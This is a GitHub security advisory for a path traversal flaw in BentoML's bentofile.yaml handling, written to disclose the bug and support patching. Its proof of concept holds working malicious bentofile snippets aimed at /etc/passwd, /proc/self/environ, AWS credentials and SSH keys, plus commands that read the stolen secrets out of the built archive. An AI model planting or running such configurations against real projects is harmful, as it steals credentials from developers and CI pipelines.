# [H] BentoML has a Path Traversal via Bentofile Configuration

## Summary
Severity: High
Advisory: GHSA-6r62-w2q3-48hf
CVE: CVE-2026-24123
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-01-26
Source: https://github.com/advisories/GHSA-6r62-w2q3-48hf
Type: github-advisory

## Affected
- PyPI: `bentoml` — affected >=0 <1.4.34

## Details
### Summary

BentoML's `bentofile.yaml` configuration allows path traversal attacks through multiple file path fields (`description`, `docker.setup_script`, `docker.dockerfile_template`, `conda.environment_yml`). An attacker can craft a malicious bentofile that, when built by a victim, exfiltrates arbitrary files from the filesystem into the bento archive. This enables supply chain attacks where sensitive files (SSH keys, credentials, environment variables) are silently embedded in bentos and exposed when pushed to registries or deployed.

### Details

The vulnerability exists in how BentoML resolves user-provided file paths without validating that they remain within the build context directory.

**Vulnerable function** in `src/bentoml/_internal/utils/filesystem.py:114-131`:

```python
def resolve_user_filepath(filepath: str, ctx: t.Optional[str]) -> str:
    _path = os.path.expanduser(os.path.expandvars(filepath))
    if not os.path.isabs(_path) and ctx:
        _path = os.path.expanduser(os.path.join(ctx, filepath))
    if os.path.exists(_path):
        return os.path.realpath(_path)  # No path containment check
    raise FileNotFoundError(f"file {filepath} not found")
```

**Vulnerable code** in `src/bentoml/_internal/bento/bento.py:348-355`:

```python
if build_config.description.startswith("file:"):
    file_name = build_config.description[5:].strip()
    if not ctx_path.joinpath(file_name).exists():
        raise InvalidArgument(f"File {file_name} does not exist.")
    shutil.copy(ctx_path.joinpath(file_name), bento_readme)  # Path traversal
```

All four vulnerable fields:
- `description: "file:../../../etc/passwd"` → copied to `README.md`
- `docker.setup_script: "../../../etc/passwd"` → copied to `env/docker/setup_script`
- `docker.dockerfile_template: "../../../secret"` → copied to `env/docker/Dockerfile.template`
- `conda.environment_yml: "../../../etc/hosts"` → copied to `env/conda/environment.yml`

**Multiple path formats are supported, making exploitation trivial:**

| Format | `description` | `setup_script` | `dockerfile_template` | `environment_yml` |
|--------|---------------|----------------|----------------------|-------------------|
| Absolute paths (`/etc/passwd`) | Yes | Yes | Yes | Yes |
| Tilde expansion (`~/.ssh/id_rsa`) | No | Yes | Yes | Yes |
| Env vars (`$HOME/.aws/credentials`) | No | Yes | Yes | Yes |
| Relative traversal (`../../../etc/passwd`) | Yes | Yes | Yes | Yes |
| Proc filesystem (`/proc/self/environ`) | Yes | Yes | Yes | Yes |

The `description` field uses `pathlib.Path.joinpath()` directly, while other fields use `resolve_user_filepath()` which calls `os.path.expanduser()` and `os.path.expandvars()`.

The `/proc/self/environ` vector is particularly dangerous in CI/CD pipelines where secrets are commonly passed as environment variables (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_PASSWORD`, etc.).

### PoC

1. Create a minimal service:

```python
# service.py
import bentoml

@bentoml.service
class TestService:
    @bentoml.api
    def predict(self, text: str) -> str:
        return text
```

2. Create malicious `bentofile.yaml`. Multiple attack vectors are available:

**Vector 1: Exfiltrate /etc/passwd via description field**
```yaml
service: "service.py:TestService"
description: "file:/etc/passwd"
```

**Vector 2: Exfiltrate all environment variables (CI/CD secrets)**
```yaml
service: "service.py:TestService"
description: "file:/proc/self/environ"
```

**Vector 3: Exfiltrate files using environment variable expansion (docker fields only)**
```yaml
service: "service.py:TestService"
docker:
  dockerfile_template: "$HOME/.aws/credentials"
```

**Vector 4: Exfiltrate files using tilde expansion (docker fields only)**
```yaml
service: "service.py:TestService"
docker:
  dockerfile_template: "~/.ssh/id_rsa"
```

Note: The `description` field does not support `~` or `$VAR` expansion. Use absolute paths or relative traversal for `description`. The `docker.*` and `conda.*` fields support all path formats.

3. Run build:

```bash
$ bentoml build
Successfully built Bento(tag="test_service:abc123").
```

4. Verify exfiltration:

```bash
# For description field - check README.md
$ cat ~/bentoml/bentos/test_service/abc123/README.md
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

# For /proc/self/environ - extract CI/CD secrets
$ cat ~/bentoml/bentos/test_service/abc123/README.md | tr '\0' '\n' | grep -E "KEY|TOKEN|SECRET"
AWS_SECRET_ACCESS_KEY=AKIA...
GITHUB_TOKEN=ghp_...

# For dockerfile_template - check Dockerfile.template
$ cat ~/bentoml/bentos/test_service/abc123/env/docker/Dockerfile.template
[default]
aws_access_key_id = AKIA...
aws_secret_access_key = ...
```

The exfiltrated contents are embedded in the bento archive and will be included in any push, export, or containerization of the bento.

### Impact

**Who is impacted:** Any user who runs `bentoml build` on an untrusted `bentofile.yaml` (e.g., cloned from a malicious repository).

**Attack scenarios:**
- **Supply chain attack:** Malicious contributor adds path traversal to a public ML project; anyone who clones and pushes their built model has their files exfiltrated
- **CI/CD environment variable theft:** Using `file:/proc/self/environ`, an attacker can exfiltrate ALL environment variables from the build process. CI/CD pipelines commonly inject secrets this way (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_URL`, etc.), making this a single-payload method to steal all pipeline secrets.
- **BentoCloud exfiltration:** When victims push compromised bentos to BentoCloud (`bentoml push`), exfiltrated files are uploaded to the cloud platform. Any user with access to the BentoCloud organization (team members, contractors, or attackers with compromised accounts) can download the bento and extract stolen credentials. This turns BentoCloud into an unwitting exfiltration channel.
- **Data theft:** Proprietary source code, configuration files, or database credentials embedded in bentos pushed to shared registries or BentoCloud deployments

## References
- https://github.com/bentoml/BentoML/security/advisories/GHSA-6r62-w2q3-48hf
- https://nvd.nist.gov/vuln/detail/CVE-2026-24123
- https://github.com/bentoml/BentoML/commit/84d08cfeb40c5f2ce71b3d3444bbaa0fb16b5ca4
- https://github.com/bentoml/BentoML
- https://github.com/bentoml/BentoML/releases/tag/v1.4.34
